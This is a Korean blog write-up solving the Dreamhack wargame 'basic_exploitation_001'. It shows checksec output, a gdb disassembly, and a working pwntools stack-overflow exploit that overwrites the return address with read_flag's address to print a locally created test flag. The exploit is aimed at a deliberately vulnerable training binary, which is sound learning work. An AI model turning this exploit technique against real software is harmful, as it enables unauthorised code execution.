---
title: basic_exploitation_001
author: hwang
date: 2024-05-12 23:30:00 +0900
categories: [Dreamhack, System Hacking]
tags: [basic_exploitation_001]     # TAG names should always be lowercase
---

## Description
이 문제는 서버에서 작동하고 있는 서비스(basic_exploitation_001)의 바이너리와 소스 코드가 주어집니다.
프로그램의 취약점을 찾고 익스플로잇해 "flag" 파일을 읽으세요.
"flag" 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
플래그의 형식은 DH{...} 입니다.

## Environment
```text
Ubuntu 16.04
Arch:     i386-32-little
RELRO:    No RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

## Solution
먼저, basic_exploitation_001에 적용된 보안 기법을 확인하였다.
```bash
$ checksec basic_exploitation_001
```
결과는 위의 Environment와 같다. x86 아키텍쳐에서 작동하고, NX가 작동한다. 저번처럼 버퍼에서 쉘코드를 실행시키는 것은 불가능하다.

이후, pwndbg로 디버깅하였다.
```bash
$ sudo gdb -q basic_exploitation_001

pwndbg> disassemble main
```

결과는 다음과 같다.
```text
Dump of assembler code for function main:
   0x080485cc <+0>:	push   ebp
   0x080485cd <+1>:	mov    ebp,esp
   0x080485cf <+3>:	add    esp,0xffffff80
   0x080485d2 <+6>:	call   0x8048572 <initialize>
   0x080485d7 <+11>:	lea    eax,[ebp-0x80]
   0x080485da <+14>:	push   eax
   0x080485db <+15>:	call   0x80483d0 <gets@plt> //"gets(buf)"
   0x080485e0 <+20>:	add    esp,0x4
   0x080485e3 <+23>:	mov    eax,0x0
   0x080485e8 <+28>:	leave  
   0x080485e9 <+29>:	ret    
End of assembler dump.
```

첨부된 c언어 코드를 살펴보면, read_flag()함수가 코드 내에 존재함을 알 수 있다. elf파일 내에 심볼들의 주소 중 read_flag()의 주소를 읽어서 사용할 수 있다. 스택 프레임 구조는 저번과 같다.

pwntools을 이용하여 exploit 코드를 작성하였다.
```python
from pwn import *

p = process('./basic_exploitation_001')

elf = ELF('./basic_exploitation_001')
read_flag = elf.symbols['read_flag']

payload = b"A" * 128
payload += b"B" * 4
payload += p32(read_flag)

p.sendline(payload)
data = p.recvuntil(b'}')
print(data)
```
실행 결과는 다음과 같다.
```text
[+] Starting local process './basic_exploitation_001': pid 5529
[*] '/home/hwangshincheol/test/basicexploitation/basic_exploitation_001'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
b'DH{Hellothisisatestflag}'
[*] Stopped process './basic_exploitation_001' (pid 5529)
```
> `Flag` 파일을 임의로 생성하였다.
{: .prompt-info }